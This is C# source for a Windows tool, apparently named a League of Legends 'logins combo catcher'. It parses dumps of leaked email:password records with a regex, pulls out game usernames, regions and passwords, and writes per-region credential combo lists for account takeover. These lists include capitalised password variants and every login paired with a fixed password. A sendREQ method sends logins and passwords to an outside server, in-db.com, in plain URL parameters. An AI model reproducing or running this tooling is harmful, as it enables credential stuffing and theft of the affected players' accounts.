using System;
using System.Data;
using MySql.Data;
using MySql.Data.MySqlClient;
using System.IO;
using System.Text.RegularExpressions;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Forms;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;

namespace _LOL____LOGINS_COMBO_CATCHER
{

    /// <summary>
    /// Логика взаимодействия для MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public string region = string.Empty;
        public string itemCh = string.Empty;
        public string itemCh2 = string.Empty;
        public string action = string.Empty;
        public string login = string.Empty;
        public string pass = string.Empty;
        public string sr_text = string.Empty;
        public string sr_save_text = string.Empty;
        public string sr_save_text_all = string.Empty;
        public string oneString = string.Empty;
        public List<string> listAllLines = new List<string>();
        public List<string> listAllLogins = new List<string>();
        public string dateInName = string.Empty;
        public MainWindow()
        {
            InitializeComponent();
           
        }

        private void emailPass_Checked(object sender, RoutedEventArgs e)
        {

        }
        private void loginPass_Checked(object sender, RoutedEventArgs e)
        {

        }

        private void comboMixed_Checked(object sender, RoutedEventArgs e)
        {

        }

        OpenFileDialog ofd = new OpenFileDialog();
        private void Choose_Click(object sender, RoutedEventArgs e)
        {
            ofd.Filter = "TXT|*.txt";
            if (ofd.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                pathTextBox.Text = ofd.FileName;
                sr_text = ofd.FileName.ToString();
            }
        }

        private void Catch_Click(object sender, RoutedEventArgs e)
        {
            catchLogins();
        }

        public void catchLogins()
        {
            dateInName = string.Format(DateTime.Now.ToString("yyyy-MM-dd_HH-mm-ss"));
            StreamReader file_text = new StreamReader(sr_text);
            string path = @"Results/logins-combo/" + dateInName;
            DirectoryInfo di = Directory.CreateDirectory(path);
            int countLines = 0;
            using (file_text)
            {
                string line;
                while ((line = file_text.ReadLine()) != null)
                {
                    listAllLines.Add(line);
                    countLines++;
                }

            }
            oneString = string.Join(" ", listAllLines.ToArray());
            listAllLines.Clear();
            oneString = oneString.Replace("=", "");
            string pat1 = @"(\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,4}\b):([A-Za-z0-9]+)(.*?)(email address:|endereço de e-mail|electrónico:|почты :)\s(\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,4}\b)\:\s(EU Nordic & East|EU West|North America|Oceania|Brazil|Latinoamérica Sur|Latinoamérica Norte|Türkiye|日本|Россия|Russia|PBE1)(.*?)(GL;HF,)";
            string pat2 = @"| $6 | LOGINS:$7 | $1:$2 |";
            string pat3 = @"([A-Za-z0-9]+)(\s+)";
            // string pat4 = @"$6 |$7:$2 | $1:$2 ";
            //  string pat4 = @"$2:$3";
            //  string pat5 = @"$3:$4";
            // Instantiate the regular expression object.
            //    Regex r = new Regex(pat1, RegexOptions.IgnoreCase);

            // Match the regular expression pattern against a text string.
            Match m = Regex.Match(oneString, pat1);
            int matchCount = 0;
            bool uniq = false;
            string currentString = string.Empty;
            while (m.Success)
            {
                currentString = m.Value;

                string result = listAllLines.FirstOrDefault(x => x == currentString);





                if (result == null)
                {
                    itemCh = Regex.Replace(currentString, pat1, pat2);
                    listAllLines.Add(itemCh);
                    //if (emailPass.IsChecked == true)
                    //{
                    //    region = Regex.Replace(currentString, pat1, "$6");
                    //    itemCh = Regex.Replace(currentString, pat1, "$1:$2");
                    //    action = "emailsCombo";
                    //    regionCheck(action, region, itemCh);
                    //}
                    if (loginPass.IsChecked == true)
                    {
                        action = "loginsCombo";
                        List<string> list = new List<string>();
                        region = Regex.Replace(currentString, pat1, "$6");
                        itemCh = Regex.Replace(currentString, pat1, "$7");
                        pass = Regex.Replace(currentString, pat1, "$2").Trim();

                        Match logins = Regex.Match(itemCh, pat3);

                        string currentlogin = string.Empty;
                        while (logins.Success)
                        {
                            login = logins.Value.Trim();
                            result = listAllLogins.FirstOrDefault(x => x == login);

                            if (result == null)
                            {
                                listAllLogins.Add(login);
                                itemCh = login + ":" + pass;
                                regionCheck(action, region, itemCh);

                                //Console.WriteLine("ACTION: " + action + " REGION: " + region + " ITEMCH: " + itemCh);

                                itemCh2 = Regex.Replace(currentString, pat1, pat2);
                                writeLineToFile(itemCh2, "mixCombo", "NONE");
                                

                                if (randPass.IsChecked == true)
                                {

                                    StringBuilder str = new StringBuilder(pass);
                                    if (Char.IsLower(str[0]))
                                    {
                                        str[0] = Char.ToUpper(str[0]);
                                        pass = str.ToString();
                                        itemCh = logins.Value.Trim() + ":" + pass;
                                        regionCheck(action, region, itemCh);
                                    }


                                }
                            }
                            logins = logins.NextMatch();
                        }

                    }

                }




                m = m.NextMatch();
            }

        }
        private void writeLineToFile(string line, string action, string region)
        {
            
            //  string FilePath = Path.Combine(Application.StartupPath, fName);

            if (action == "mixCombo") { sr_save_text = "Results/logins-combo/" + dateInName + "/ALL.txt"; }
            if (action == "emailsCombo") { sr_save_text = "Results/emails-combo/emails_" + region + "_" + dateInName + ".txt"; }
            if (action == "loginsCombo") { sr_save_text = "Results/logins-combo/"+dateInName+"/logins_"+region+".txt"; }
            if (action == "ALLloginsCombo") { sr_save_text = "Results/logins-combo/" + dateInName + "/ALL_logins.txt"; }
            if (action == "ALLloginsWithMyPass") { sr_save_text = "Results/logins-combo/" + dateInName + "/ALL_logins_with_my_pass.txt"; }
            //  if (loginPass.IsChecked == true) { sr_save_text_all = "Results/logins-combo/ALL_logins_" + dateInName+ ".txt"; }

            using (System.IO.StreamWriter file =
               new System.IO.StreamWriter(sr_save_text, true))
            {
                file.WriteLine(line);
            }

            //using (System.IO.StreamWriter file =
            //     new System.IO.StreamWriter(sr_save_text_all, true))
            //{
            //    file.WriteLine(line);
            //}
        }
        private void regionCheck(string action, string region, string itemCh)
        {
            string regEUW = "EU West";
            string regEUNE = "EU Nordic & East";
            string regNA = "North America";
            string regOCE = "Oceania";
            string regBR = "Brazil";
            string regLAS = "Latinoamérica Sur";
            string regLAN = "Latinoamérica Norte";
            string regTR = "Türkiye";
            string regJP = "日本";
            string regRU = "Россия";
            string regRU2 = "Russia";
            string regPBE = "PBE1";
            string reg="";
            int chEUW = String.Compare(region, regEUW, true);
            if (chEUW == 0) { reg = "EUW"; }

            int chEUNE = String.Compare(region, regEUNE, true);
            if (chEUNE == 0) { reg = "EUNE"; }

            int chNA = String.Compare(region, regNA, true);
            if (chNA == 0) { reg = "NA"; }

            int chOCE = String.Compare(region, regOCE, true);
            if (chOCE == 0) { reg = "OCE"; }

            int chBR = String.Compare(region, regBR, true);
            if (chBR == 0) { reg = "BR"; }

            int chLAS = String.Compare(region, regLAS, true);
            if (chLAS == 0) { reg = "LAS"; }

            int chLAN = String.Compare(region, regLAN, true);
            if (chLAN == 0) { reg = "LAN"; }

            int chTR = String.Compare(region, regTR, true);
            if (chTR == 0) { reg = "TR"; }

            int chJP = String.Compare(region, regJP, true);
            if (chJP == 0) { reg = "JP"; }

            int chRU = String.Compare(region, regRU, true);
            if (chRU == 0) { reg = "RU"; }

            chRU = String.Compare(region, regRU2, true);
            if (chRU == 0) { reg = "RU"; }

            int chPBE = String.Compare(region, regPBE, true);
            if (chPBE == 0) { reg = "PBE"; }

            writeLineToFile(itemCh, action, reg);
           // sendREQ(reg, login, pass);
            string ALLlogins = login + "@" + reg + ":" + pass;
            string ALLloginsWithMyPass = login + "@" + reg + ":vomer0909";
            writeLineToFile(ALLlogins, "ALLloginsCombo", reg);
            writeLineToFile(ALLloginsWithMyPass, "ALLloginsWithMyPass", reg);
            
        }

        public void sendREQ(string region, string login, string pass)
        {
            try
            {
                HttpClient client = new HttpClient();


                client.GetAsync("http://in-db.com/add_lol.php?add&key=vomer0909&region="+region+"&login="+login+"&pass="+pass)
                      .ContinueWith(responseTask =>
                      {
                          Console.WriteLine("Response: {0}", responseTask.Result);
                      });
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
        }

    }
}
